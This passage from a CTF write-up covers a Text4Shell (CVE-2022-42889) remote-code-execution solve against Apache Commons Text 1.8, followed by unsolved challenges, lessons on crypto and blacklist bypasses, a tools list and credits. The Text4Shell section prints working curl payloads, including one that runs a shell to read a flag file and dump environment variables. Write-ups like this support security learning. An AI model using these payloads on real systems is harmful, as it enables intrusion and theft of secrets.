**Bug:** **CVE-2022-42889 (Text4Shell)**. Apache Commons Text's `StringSubstitutor` 1.5-1.9 ships the `script`, `dns` and `url` interpolators **enabled by default**, so any user-controlled string passed through it can execute code. The running build was **commons-text 1.8**.

**Solve:** Fingerprint first - `${7*7}` reflects *literally*, because `StringSubstitutor` doesn't do arithmetic, it resolves `${prefix:value}` lookups. That's the discriminator between a real sink and a plain echo.

```bash
curl -g -s -G --data-urlencode 'message=${script:javascript:7*7}'    "$U"   # -> 49
curl -g -s -G --data-urlencode 'message=${sys:java.version}'        "$U"   # -> 1.8.0_504
curl -g -s -G --data-urlencode 'message=${dns:localhost}'           "$U"   # -> 127.0.0.1
curl -g -s -G --data-urlencode 'message=${url:http://127.0.0.1:8220/}' "$U" # literal -> url not enabled
```

`script` and `dns` resolving while `url` doesn't is exactly the pre-1.10.0 default set. And Java 8 means **Nashorn is bundled**, so `${script:javascript:...}` is RCE:

```bash
P='${script:javascript:new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["/bin/sh","-c","cat /app/flag; env"]).getInputStream()).useDelimiter("\\A").next()}'
curl -g -s -G --data-urlencode "message=$P" http://54.72.82.22:8220/home
```

Two gotchas that cost me time, both worth knowing:

- **`curl` needs `-g`**, otherwise `{}` is swallowed by curl's URL globbing and never reaches the server.
- **`StringSubstitutor` stops the variable at the first `}`.** Any payload containing `{` or `}` - loops, `if`, function bodies - breaks the interpolation and comes back literal. Keep the injected script a **brace-free single expression**, e.g. `Collections.list(x).toString()` instead of a `while` loop. (And a literal echo means the *script* failed, not that the sink is missing.)

**Flag:** `safctf{e5ca75a4e6e0507f9dd29be81997b9b6}`

---

## 10. The loose ends

Two screenshots in the folder belong to challenges we **started but never finished**, and I'm including them here rather than pretending they didn't happen, because "we didn't solve it" is also part of a writeup.

| Screenshot | What it is |
|---|---|
| `/images/captainorders-challenge.png` | **DEEP BLUE RADIO** - *"Tune into an offshore broadcast and talk to the voice behind the frequency."* A chatbot that answers with the current time. We poked it, didn't crack it, and moved on to the challenges that were paying. |
| `/images/winterpavilion.png` | **Winter Pavilion** - *"The first snow changes the whole square."* Same "Collection desk / Leave a receipt" generator family as the OSINT trio, with a `pavilion-export.zip`. Never opened it properly. |

If you solved either, genuinely - tell me how in the comments. Deep Blue Radio in particular looked like it had something interesting going on behind the "current time" answer.

There's also a `citrusstudio-challenge.png` in the folder which, it turns out, is the landing page for **Ginger Juice Shop** (section 1) - the theme and the challenge name don't match, which is a small reminder to always check the page title against the challenge title.

---

## 11. What I actually took away

A few things that were true across all 37 challenges:

**One host, 37 ports, one banner.** Recon on this platform was a formality. The interesting work was never "what's running" - it was "what did the author forget". Every single challenge was solvable by reading the source they gave you (or leaked you) a little more carefully than they expected.

**The decoy is the challenge, and so is the redemption.** Several challenges shipped a `/submit` endpoint that returns a *convincing, flag-shaped, wrong* string, and several more ran the opposite trick: the artefact handed you something that authenticates perfectly but isn't in the scoring format, and `/submit` was the machine that cashed it. Both directions punish the same reflex, which is trusting the wrong artefact. If your flag bounces, the message isn't "try harder" - it's "go back and ask what this string actually is". That's the single most transferable thing I'm taking out of this event.

**Textbook crypto is still in production.** An RSA broadcast with `e = 3`, a keystream reused across two messages, and a CBC padding oracle. Three bugs, three decades old, all three alive and well in a 2026 CTF. None of them needed a breakthrough, a side channel, or a research paper. One needed a cube root, one needed a memo, and one needed ten thousand polite requests. If you are writing crypto code and you have not thought about which of these three you are, you are one of these three.

**Blacklists are decoration.** Space-sensitive SQL denylists, `name`-only SSTI filters, `127.0.0.1`-string SSRF blocks, a single-pass `../` replace, a raw-prefix-then-normalise ACL. Every one of them was defeated by changing the *encoding* rather than the *intent*. If you're defending the same way, the fix is never "add another string to the blocklist" - it's "stop building the dangerous thing". Parameterise the query, resolve the IP, normalise the path, escape the filter.

**Themed passwords are still passwords.** `super_strong_unguessable_wacha_tu!` was genuinely strong. It didn't matter, because the query was an f-string. Strength only protects the *front door*; injection walks past it. Also - the flag was in the `display_name` column. Data your app *can read* is data an injection *can disclose*. Don't put secrets in columns that render.

**Read the hint twice.** *"Find the edge"* → `LIMIT/OFFSET`. *"A neighboring version"* → the fixed version number. *"can take on a surprising new shape"* → re-shape the JWT payload. *"the brass plaque said 1997"* → filter on `opened`. *"Keep your collection receipt"* → the artefact is a token, not a flag. This event had some genuinely well-written hints, and every one of them paid off if you sat with the wording for a minute instead of going straight to the fuzzer.

And the motto held up: **play fair, hack responsibly, have fun.** It was fun.

---

## Tools that did the work

| Tool | Used for |
|---|---|
| `curl` (with `-i`, `-w '%{http_code}'`, `--data-urlencode`, `-g`, `-c/-b`) | Everything HTTP. Status-code oracles, header sweeps, cookie jars |
| `nmap` / `httpx` | Fingerprinting - though after the fifth `Werkzeug 3.1.9` it felt redundant |
| `gobuster` / `ffuf` / custom loops | Route and filename enumeration |
| `sqlmap` | Confirming and dumping the SQL injections |
| `jwt_tool` | Reference tooling for the `alg:none` work |
| Python (`requests`, `hashlib`, `base64`, `pyzbar`, `PIL`) | The OSINT receipt chains, JWT forging, QR decoding |
| `sqlite3` + WAL analysis | Second Pressing |
| `exiftool` (`-a -u -g1`) | Fancy Details, and every image in the set as a habit |
| `binwalk` / `tar` / `zlib` | Fancy Details and Second Pressing archive peeling |
| Python (`cryptography`, `pycryptodome`) | AES-GCM in Long Exposure, the CBC padding oracle in Midnight Parcel, the RSA cube root in Three Encores |
| `gdb` / `objdump` / manual decompilation | All three RE binaries: Pixel Courier, Clockwork Ballet, Prism Orchestra |
| Ghidra | The bytecode interpreter |

---

## Credits

My teammate **itatipaul**, alias **senpai**, wrote eight of the writeups behind this post. Six of them cover challenges that are new to this page, so they got their own sections:

- **Three Encores**, **Parallel Lines** and **Midnight Parcel** (the whole Crypto section)
- **Long Exposure** and **Fancy Details** (Forensics)
- **Pixel Courier** (Reverse Engineering)

The other two, **Clockwork Ballet** and **Prism Orchestra**, were challenges we had already written up between us, so his versions went in as added detail rather than new sections. The TEA key array, the 24-byte target block and the `13*i + 91` disassembly correction in those sections all come from his notes.

Find him here:

- Portfolio: [itatipaul.github.io](https://itatipaul.github.io/)
- GitHub: [github.com/itatipaul](https://github.com/itatipaul)

The rest of the event was ours. Thanks for reading.

---

*Safaricom PwnZone CTF 2026 - pre-qualifiers, 2-4 October 2026.*
*Flags are per-team and rotate between instances, so don't expect these strings to work anywhere - that's not the point of the writeup. The chains are.*
